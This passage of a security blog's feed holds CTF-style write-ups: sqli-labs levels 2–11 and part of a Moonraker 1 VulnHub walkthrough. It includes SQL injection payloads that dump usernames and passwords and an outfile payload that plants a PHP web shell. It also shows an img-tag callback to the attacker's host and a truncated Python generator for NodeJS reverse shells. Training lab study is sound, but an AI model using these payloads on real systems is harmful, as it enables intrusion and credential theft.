class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1 order by 3%23</span><br><span class="line">&#x2F;&#x2F;确认可显示字段数</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0 union select 1,2,3</span><br><span class="line">&#x2F;&#x2F;确认哪些字段可用来注入，id为0是因为网页只能显示一条数据，所以要选一个不存在的id</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23  &#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&quot;users&quot; %23  &#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0 union select 1,group_concat(username),group_concat(password) from users %23</span><br><span class="line">&#x2F;&#x2F;显示用户名和密码信息</span><br></pre></td></tr></table></figure><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="- Less-3"></a>- Less-3</h3><p>输入<code>&quot;</code>没有显示结果，但没有报错，显然是把双引号当成ID的参数输入了，然后输入<code>&#39;</code>，报错了。</p><p><img src="6.png" alt="6"></p><p>从报错的信息我们可以知道原查询语句中有<code>&#39;)</code>，所以我们使用下面的语句验证一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&#39;) and 1&#x3D;1%23 &#x2F;&#x2F;正常有显示</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;1&#39;) and 1&#x3D;2%23 &#x2F;&#x2F;正常无显示</span><br></pre></td></tr></table></figure><p>验证成功，那我们可以开始注入了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;0&#39;) order by 3%23</span><br><span class="line">&#x2F;&#x2F;确认可显示字段数</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0&#39;) union select 1,2,3%23</span><br><span class="line">&#x2F;&#x2F;确认信息显示位置</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23  &#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&quot;users&quot; %23  &#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0&#39;) union select 1,group_concat(username),group_concat(password) from users %23</span><br><span class="line">&#x2F;&#x2F;显示用户名和密码信息</span><br></pre></td></tr></table></figure><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="- Less-4"></a>- Less-4</h3><p>第四关和第三关一样，只不过原查询语句由<code>&#39;)</code>变成了<code>&quot;)</code>，所以本题的注入语句把上一关的<code>&#39;</code>换成<code>&quot;</code>即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;0&quot;) order by 3%23</span><br><span class="line">&#x2F;&#x2F;确认可显示字段数</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0&quot;) union select 1,2,3%23</span><br><span class="line">&#x2F;&#x2F;确认信息显示位置</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23  &#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&quot;users&quot; %23  &#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;0&quot;) union select 1,group_concat(username),group_concat(password) from users %23</span><br><span class="line">&#x2F;&#x2F;显示用户名和密码信息</span><br></pre></td></tr></table></figure><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="- Less-5"></a>- Less-5</h3><p>我们输入<code>id=1</code>，发现可以正常显示，但是显示的不是用户名信息，而是显示you are in，表示正常查询。</p><p><img src="7.png" alt="7"></p><p>输入<code>id=0</code>，发现查询结果不存在是显示为空</p><p><img src="8.png" alt="8"></p><p>一样通过报错知道ID参数是字符型且使用单引号闭合。</p><p><img src="9.png" alt="9"></p><p>因为查询信息无法显示到页面，所以不能使用union联合查询，但是我们可以使用报错注入。报错注入的原理：<a href="https://warm-glow.fun/2020/03/17/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">sql报错注入</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&#39; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) %23  &#x2F;&#x2F;爆表</span><br></pre></td></tr></table></figure><p><img src="12.png" alt="12"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&#39; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot;))) %23  &#x2F;&#x2F;爆字段</span><br></pre></td></tr></table></figure><p><img src="10.png" alt="10"></p><p>发现页面做了限制，无法完全显示，那我们就只能慢慢修改查询语句了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&#39; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;)))) %23</span><br></pre></td></tr></table></figure><p>把已经显示的字符串加入到not in的列表里面，多加几次，就可以看到全部的字段名了。</p><p><img src="11.png" alt="11"></p><p>知道所有字段名后，就是爆我们需要的值了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&#39; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) %23  &#x2F;&#x2F;获取字段值</span><br></pre></td></tr></table></figure><p>我们需要username和password两个字段的值，所以用concat函数用<code>:(0x3a)</code>把他们连起来输出，但是依旧有无法输出完全的问题，所以和上面一样的已经显示出来的用户名加入到not in的列表中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&#39; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in(&#39;Dumb&#39;,&#39;Angelina&#39;)))) %23</span><br></pre></td></tr></table></figure><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="- Less-6"></a>- Less-6</h3><p>第六关和第五关一样的考点，只不过闭合参数的单引号变成了双引号，其他的不变。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&quot; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) %23  &#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;1&quot; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot;))) %23  &#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;1&quot; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;)))) %23  &#x2F;&#x2F;显示剩下的字段</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;1&quot; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) %23  &#x2F;&#x2F;获取字段值</span><br><span class="line"></span><br><span class="line">payload&#x3D;?id&#x3D;1&quot; and 1&#x3D;extractValue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in(&#39;Dumb&#39;,&#39;Angelina&#39;)))) %23  &#x2F;&#x2F;显示剩下的值</span><br></pre></td></tr></table></figure><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="- Less-7"></a>- Less-7</h3><p>输入<code>?id=1</code>，正常显示，并且提示我们使用outfile。</p><p><img src="13.png" alt="13"></p><p>首先，我们需要弄清楚本题的sql是如何闭合的。测试单双引号，输入单引号提示sql语法错误，所以有单引号，但是我们输入<code>?id=1&#39; and 1=1%23</code>还是报错</p><p><img src="14.png" alt="14"></p><p>说明还有其他闭合条件，只能试，输入<code>?id=1&#39;)) and 1=1%23</code>正常了，所以闭合条件是<code>&#39;))</code></p><p>本题要求我们使用outfile。<code>outfile</code>函数就是将数据库的查询内容导出到一个外部文件。还有一个函数<code>load_file</code>，它的作用就是从操作系统向数据库写入文件，和<code>outfile</code>函数作用相反。还有一个转储函数<code>dumpfile</code>它也可以导出数据，但是只能导出一行，所以导出时要对数据行数做出限制。</p><p>我们本题只需要用outfile上传一个文件就行了，所以我们上传一句话木马。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;?id&#x3D;1&#39;)) union select 1,&#39;2&#39;,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &#39;C:\\WWW\\sqli-labs-master\\test1.php&#39; %23  </span><br><span class="line">&#x2F;&#x2F;往靶机的C:\WWW\sqli-labs-master目录下写入一句话木马</span><br></pre></td></tr></table></figure><p><img src="15.png" alt="15"></p><p><img src="16.png" alt="16"></p><p>可以看到我们已经成功的在靶机下面写入了一句话木马。但是为什么页面会显示语法错误呢？这是因为outfile函数的导出目录是在数据库规定好的。可以使用<code>show variables like &#39;%secure%&#39;;</code>查看本机数据库的导出目录，如果随便导出到一个文件夹就会报错。</p><p><img src="17.png" alt="17"></p><p>我靶机的mysql没有设置<code>secure_file_priv</code>导出路径，所以会报错，如果你导出的路径是<code>secure_file_priv</code>的话就不会报错了。</p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="- Less-8"></a>- Less-8</h3><p>第八关标题提示了是布尔盲注，闭合是单引号。首先测试一下。</p><p>首先输入<code>?id=1&#39; and 1=1 --+</code>，正常显示</p><p><img src="18.png" alt="18"></p><p><code>?id=1&#39; and 1=2 --+</code>，没有回显，所以确定是单引号闭合。</p><p><img src="19.png" alt="19"></p><p>可以看到回显是布尔型回显。查询结果为真则有回显，为假则没有回显。</p><p>首先使用sqlmap跑一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.133&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1&quot; -p &quot;id&quot; --risk 3 --current-db     &#x2F;&#x2F;跑当前数据库</span><br></pre></td></tr></table></figure><p><img src="20.png" alt="20"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.133&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1&quot; -p &quot;id&quot; --risk 3 -D &quot;security&quot; --tables   &#x2F;&#x2F;跑表</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.133&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1&quot; -p &quot;id&quot; --risk 3 -D &quot;security&quot; -T &quot;users&quot; --columns    &#x2F;&#x2F;跑字段</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.133&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1&quot; -p &quot;id&quot; --risk 3 -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump    &#x2F;&#x2F;跑字段值</span><br></pre></td></tr></table></figure><p>如果是手工测试的话。就利用他的返回值为真是有回显来测，测试语句如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; or ascii(substr((select%20database()),1,1))&#x3D;115%20--+</span><br></pre></td></tr></table></figure><p>首先将id的值设为一个不存在的id，比如0或者负数，确保前面的布尔值是false，这样因为是OR逻辑，所以后面是真就会有回显。然后用substr截取字符串的每一个字符一个个猜。这里的例子在猜当前数据库的库名。115是小写字母s的ascii码。之前用sqlmap跑出来当前数据库为security，所以结果应该是有回显。</p><p><img src="21.png" alt="21"></p><p>将115改成别的，比如116应该就没有回显了。</p><p><img src="22.png" alt="22"></p><p>就像这个，猜出整个字符串即可。</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="- Less-9"></a>- Less-9</h3><p>这一关也是盲注，只不过是时间盲注。本关无论你输入什么都会回显。但是只有用单引号闭合的时间盲注测试语句才能正常延时。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试语句：?id&#x3D;1&#39; or if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),0)--+ 会延时3S</span><br><span class="line">?id&#x3D;1&#39; or if(ascii(substr(database(),1,1))&#x3D;116,sleep(3),0)--+ 不会延时</span><br></pre></td></tr></table></figure><p>sqlmap跑的命令和上一关的一样。</p><p>手工注入也和上一关一样慢慢猜字符串的每一个字符。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="- Less-10"></a>- Less-10</h3><p>这一关还是时间盲注，只不过从单引号闭合变成了双引号闭合。手工注入只需要把单引号换成双引号即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; or if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),0)--+ 会延时3S</span><br></pre></td></tr></table></figure><p>但如果用sqlmap去跑的话，命令与第八关、第九关的有点不一样。需要加一个参数–prefix</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.133&#x2F;sqli-labs-master&#x2F;Less-10&#x2F;?id&#x3D;1&quot; -p &quot;id&quot; --risk 3 --prefix &quot;%22&quot; --current-db     &#x2F;&#x2F;跑当前数据库</span><br></pre></td></tr></table></figure><p>–prefix参数是在payload前面加前缀，%22是双引号的URL编码，意思是用双引号去闭合原sql查询语句。</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="- Less-11"></a>- Less-11</h3><p>这一关有了输入框，请求方式从GET变成了POST，参数不再从URL中传参。</p><p>首先在输入框中输入一个单引号，语句报错，说明是单引号闭合</p><p><img src="23.png" alt="23"></p><p>尝试一下万能密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39; or &#39;1</span><br><span class="line">password&#x3D;随便输</span><br></pre></td></tr></table></figure><p>成功登录，存在注入。</p><p><img src="24.png" alt="24"></p><p>使用order by语句测试字段数。发现字段数为2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; order by 2#</span><br></pre></td></tr></table></figure><p>然后测试哪些字段可以用来注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select 1,2#</span><br></pre></td></tr></table></figure><p><img src="25.png" alt="25"></p><p>发现1和2都可以用来注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #    &#x2F;&#x2F;爆表</span><br><span class="line">&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;user&#39; #   &#x2F;&#x2F;爆字段名</span><br><span class="line">&#39; union select group_concat(username),group_concat(password) from users# </span><br><span class="line">&#x2F;&#x2F;爆字段值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Moonraker 1靶机渗透</title>
      <link href="/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="靶机信息："><a href="#靶机信息：" class="headerlink" title="- 靶机信息："></a>- 靶机信息：</h2><ul><li>说明：您已经收到有关新反派大量投资于太空和激光技术的情报。尽管反派是谁未知，但我们知道动机不祥且世界末日。入侵Moonraker系统，一劳永逸地发现谁在这些诱人的计划背后。在为时已晚之前找到并摧毁小人！</li><li>难度：挑战级</li><li>flag：/root/flag.txt</li><li>启用DHCP</li><li>默认情况下，除了kali上的工具外，没有其他工具</li><li>学习目标：客户端攻击，NoSQL，RESTful，NodeJS，Linux枚举和Google-fu</li></ul><a id="more"></a><h2 id="渗透流程："><a href="#渗透流程：" class="headerlink" title="- 渗透流程："></a>- 渗透流程：</h2><p>首先要知道目标靶机的IP，使用<code>nmap -sP 192.168.183.1/24</code><br><img src="1.png" alt="1"></p><p>知道靶机IP后，接下来要扫描靶机端口，看看靶机开启了什么服务。<code>nmap -sV -p- --open 192.168.183.143</code><br><img src="2.png" alt="2"></p><p>开启的端口中22(SSH)、80(http)、3000(nodejs)、5984(couchdb)，这四个端口可能有用，惯例先去80端口的web页面看看。一打开就是一段电影画面，过后出现了三个按钮，都点点看，发现service按钮有新东西。滑到底部，发现给了一个链接，告诉我们如果对服务感兴趣，可以发送一个查询。<br><img src="3.png" alt="3"></p><p>点击，打开一个新的页面，提示销售代表会在5分钟内查看我们发送的信息。<br><img src="4.png" alt="4"></p><p>既然它会查看，那我们的渗透思路如下：可以发送一个img标签<code>&lt;img src=&quot;192.168.183.138/1.txt&quot;&gt;&lt;/img&gt;</code>，这个标签被插入页面后，当销售代表访问那个记录信息的页面时，这个标签就会加载。然后就会访问<code>192.168.183.138</code>即我的kali攻击机上面的1.txt文件，把它当成一张图片在页面上显示出来(这个文件是不是图片，存不存在都可以，它都会访问)。这样我们就可以从apache的日志中知道销售代表访问我们时所处页面的URL了。</p><p>思路确定了，开始操作。要发送的信息如图，在哪个框都无所谓。<br><img src="5.png" alt="5"></p><p>然后在kali启动Apache服务，记得启动前，查看下Apache的端口配置文件，确定一下Apache的端口号。<br><img src="6.png" alt="6"></p><p>我的端口是默认的80端口，所以标签里面的IP后面不需要接端口号，如果不是80，则要加端口号。然后启动Apache服务，kali的启动方法是<code>/etc/init.d/apache2 start</code>，启动后去kali浏览器访问下localhost，如下图这样就是成功启动了。<br><img src="7.png" alt="7"></p><p>然后回到靶机的那个发送请求页面，发送请求，可以看到已经发送成功了<br><img src="8.png" alt="8"></p><p>然后我们等一会，去查看apache的日志。<br><img src="9.png" alt="9"></p><p>红框里面可以看到销售代表的那个页面的网址了，去访问看看。<br><img src="10.png" alt="10"></p><p>发现是空的，我们之前发送的东西已经被删除了，但这不碍事，我们返回它的管理页面。<br><img src="11.png" alt="11"></p><p>每个都点进去看看，在第二个发现了一些关于couchdb的信息。<br><img src="12.png" alt="12"></p><p>得知了一个路径<code>/_all_dbs</code>，然后知道了jaws这个用户，密码是他的女朋友的名字+”x99”，因为网站一开始就是一段影片，所以我们google一下Moonraker jaws，发现是一部科幻电影里面的角色。然后在wiki里面找到了他女朋友的名字dolly。<br><img src="14.png" alt="14"></p><p>现在我们已经拿到了一个账户和密码。但是不要着急，看看还有没有别的关键信息。然后在第四个那里也发现了关键信息。<br><img src="13.png" alt="13"></p><p>这里大致的意思是3000端口使用了nodejs的反序列化，并给了详细代码，我们现在还用不到这个信息，先记下来。然后就没有其他关键信息了。我们转战couchdb的5984端口，然后访问一下<code>/_all_dbs</code>这个路径。<br><img src="15.png" alt="15"></p><p>这个页面输出了所有库的名字，但是没什么用处，我们现在需要一个登录后台管理的页面。google一下couchdb，查询一下默认的后台页面是什么。<br><img src="16.png" alt="16"></p><p>查询到了，是<code>/_utils</code>，访问一下，然后使用账号密码登录。用户名<code>jaws</code>，密码<code>dollyx99</code>。<br><img src="17.png" alt="17"></p><p>成功登录后，看看每个数据库里面的信息，在link库里面有新发现。<br><img src="18.png" alt="18"></p><p>发现了四条数据，都点开看看。<br><img src="19.png" alt="19"></p><p>发现每个都记录有一段URL，记下来，一个个访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;cats&#x2F;cats-gallery.html</span><br><span class="line">&#x2F;surv-cam&#x2F;recent.html</span><br><span class="line">&#x2F;HR-Confidential&#x2F;offer-letters.html</span><br><span class="line">&#x2F;x-files&#x2F;deep-space-findings.html</span><br></pre></td></tr></table></figure><p>在<code>/HR-Confidential/offer-letters.html</code>这个页面有新的收获。这里有他们的offer信息。<br><img src="20.png" alt="20"></p><p>点开发现几乎每一个都记录着他们自己的用户名和密码，都记录下来。<br><img src="21.png" alt="21"></p><p>然后在<code>/x-files/deep-space-findings.html</code>页面发现一段话。<br><img src="22.png" alt="22"></p><p>提示我们数据放到了一个更安全的地方，想到之前看到的那个提示3000端口有反序列化程序的页面，这应该是要我们去访问3000端口了。访问3000端口，需要用户名和密码，把offer letter里面的密码一个个试，发现hugo可以登录，但是登录后页面只有一句话。<br><img src="23.png" alt="23"></p><p>访问给的网址，确实是一段音频，但是没有可以提取的信息，这时候我们使用burp抓包看看。<br><img src="24.png" alt="24"></p><p>发现cookie的profile有点眼熟，想到之前看到的那个记载了3000端口使用的代码的信息，研究一下。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Stuff to import</span></span><br><span class="line">var express = require('express');</span><br><span class="line">var cookieParser = require('cookie-parser');</span><br><span class="line">var escape = require('escape-html');</span><br><span class="line">var serialize = require('node-serialize');</span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Here's the function they want reviewed...</span></span><br><span class="line"><span class="comment">// I think it decodes the weird cookie string and runs it, prints it, sets it or idk.</span></span><br><span class="line"></span><br><span class="line">app.get('/', function(req, res) &#123;</span><br><span class="line"> if (req.cookies.profile) &#123;</span><br><span class="line">    var str = new Buffer(req.cookies.profile, 'base64').toString();</span><br><span class="line">    var obj = serialize.unserialize(str);</span><br><span class="line">       if (obj.username) &#123;</span><br><span class="line">               res.send("Stuff here then print out username.. " + escape(obj.username)");</span><br><span class="line">                 &#125;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">            res.cookie('profile', "eyJ1c2VybmFtZSI6Imh1Z28ifQ==", &#123;</span><br><span class="line">  maxAge: 900000,</span><br><span class="line">                 httpOnly: true</span><br><span class="line">             &#125;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(3000);</span><br></pre></td></tr></table></figure><p>大致意思就是把cookie中的profile先base64解码，然后执行nodejs的反序列化，再检查里面是否有username的信息，没有则给profile重新赋值，我们抓包看到的值就是重新赋值的。这里的重点是反序列化，所以google一下nodejs反序列化漏洞。</p><p><span class="exturl" data-url="aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC8yMDE3LzAyLzA4L2V4cGxvaXRpbmctbm9kZS1qcy1kZXNlcmlhbGl6YXRpb24tYnVnLWZvci1yZW1vdGUtY29kZS1leGVjdXRpb24v" title="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/<i class="fa fa-external-link"></i></span> 这个人讲的比较清楚。我简单介绍一下nodejs反序列化漏洞，就是<code>unserialize()</code>是通过将带有立即调用的函数表达式（IIFE）的序列化JavaScript对象传递给节点序列化模块中的函数，因为没有对输入进行检查所以可以利用这个函数来实现任意代码执行。因为我不懂nodejs，所以我直接借用他的成果了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/python</span><br><span class="line"><span class="comment"># Generator for encoded NodeJS reverse shells</span></span><br><span class="line"><span class="comment"># Based on the NodeJS reverse shell by Evilpacket</span></span><br><span class="line"><span class="comment"># https://github.com/evilpacket/node-shells/blob/master/node_revshell.js</span></span><br><span class="line"><span class="comment"># Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)</span></span><br><span class="line"><span class="comment"># Insecurety Research (2013) - insecurety.net</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;"</span> % (sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">IP_ADDR = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charencode</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"""String.CharCode"""</span></span><br><span class="line">    encoded = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encoded = encoded + <span class="string">","</span> + str(ord(char))</span><br><span class="line">    <span class="keyword">return</span> encoded[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] LHOST = %s"</span> % (IP_ADDR)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] LPORT = %s"</span> % (PORT)</span><br><span class="line">NODEJS_REV_SHELL = <span class="string">'''</span></span><br><span class="line"><span class="string">var net = require('net');</span></span><br><span class="line"><span class="string">var spawn = require('child_process').spawn;</span></span><br><span class="line"><span class="string">HOST="%s";</span></span><br><span class="line"><span class="string">PORT="%s";</span></span><br><span class="line"><span class="string">TIMEOUT="5000";</span></span><br><span class="line"><span class="string">if (typeof String.prototype.contains === 'undefined') &#123; String.prototype.contains = function(it) &#123; return 